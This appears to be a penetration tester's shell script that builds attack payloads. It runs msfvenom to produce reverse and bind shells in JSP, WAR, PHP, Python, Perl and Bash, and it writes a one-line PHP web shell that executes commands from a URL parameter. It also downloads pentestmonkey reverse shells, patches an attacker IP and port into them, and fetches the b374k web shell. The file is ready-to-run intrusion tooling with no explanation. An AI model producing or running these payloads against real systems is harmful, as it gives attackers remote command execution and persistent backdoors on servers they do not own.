# Reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f raw > shell_reverse_tcp.jsp
msfvenom -p java/shell/reverse_tcp LHOST=$ip_local LPORT=$port_local -f war > shell_reverse_tcp.war

msfvenom -p php/php/reverse_php LHOST=$ip_local LPORT=$port_local -f raw > shell_reverse_tcp.php
cat shell_reverse_tcp.php | pbcopy && echo '<?php ' | tr -d '\n' > shell_reverse_tcp.php && pbpaste >> shell_reverse_tcp.php

# msfvenom -p php/meterpreter_reverse_tcp LHOST=$port_local LPORT=$port_local -f raw > meterpreter_reverse_tcp.php
# cat meterpreter_reverse_tcp.php | pbcopy && echo '<?php ' | tr -d '\n' > meterpreter_reverse_tcp.php && pbpaste >> meterpreter_reverse_tcp.php

msfvenom -p cmd/unix/reverse_python LHOST=$ip_local LPORT=$port_local -f raw > shell_reverse_unix.py
msfvenom -p cmd/unix/reverse_perl LHOST=$ip_local LPORT=$port_local -f raw > shell_reverse_unix.pl
msfvenom -p cmd/unix/reverse_bash LHOST=$ip_local LPORT=$port_local -f raw > shell_reverse_unix.sh

# Bind shell
msfvenom -p java/jsp_shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f raw > shell_bind_tcp.jsp
msfvenom -p java/shell/bind_tcp LPORT=$port_remote -f war > shell_bind_tcp.war

msfvenom -p php/php/bind_php LPORT=$port_remote -f raw > shell_bind_tcp.php
cat shell_bind_tcp.php | pbcopy && echo '<?php ' | tr -d '\n' > shell_bind_tcp.php && pbpaste >> shell_bind_tcp.php

# msfvenom -p php/meterpreter_bind_tcp LPORT=$port_remote -f raw > meterpreter_bind_tcp.php
# cat meterpreter_bind_tcp.php | pbcopy && echo '<?php ' | tr -d '\n' > meterpreter_bind_tcp.php && pbpaste >> meterpreter_bind_tcp.php

msfvenom -p cmd/unix/bind_python LPORT=$port_remote -f raw > shell_bind_unix.py
msfvenom -p cmd/unix/bind_perl LPORT=$port_remote -f raw > shell_bind_unix.pl


echo '<?php system($_GET["cmd"]); ?>' > cmd.php

wget https://raw.githubusercontent.com/pentestmonkey/perl-reverse-shell/master/perl-reverse-shell.pl -O pentestmonkey-perl-reverse-shell.pl
sed -i "s/127.0.0.1/$ip_local/g" pentestmonkey-perl-reverse-shell.pl
sed -i "s/1234/$port_local/g" pentestmonkey-perl-reverse-shell.pl

wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O pentestmonkey-php-reverse-shell.pl
sed -i "s/127.0.0.1/$ip_local/g" pentestmonkey-php-reverse-shell.pl
sed -i "s/1234/$port_local/g" pentestmonkey-php-reverse-shell.pl

#wget https://github.com/pentestmonkey/php-findsock-shell/blob/master/findsock.c
#gcc -o findsock findsock.c
#wget https://raw.githubusercontent.com/pentestmonkey/php-findsock-shell/master/php-findsock-shell.php -O pentestmonkey-php-findsock-reverse-shell.pl

curl -s https://api.github.com/repos/b374k/b374k/releases/latest \
 | grep "zipball_url.*zip" \
 | cut -d : -f 2,3 \
 | tr -d \" \
 | tr -d , \
 | wget -qi -O b374k.zip -
unzip b374k.zip -d b374k
rm b374k.zip
cp b374k/b374k.* .
rm -rf b374k
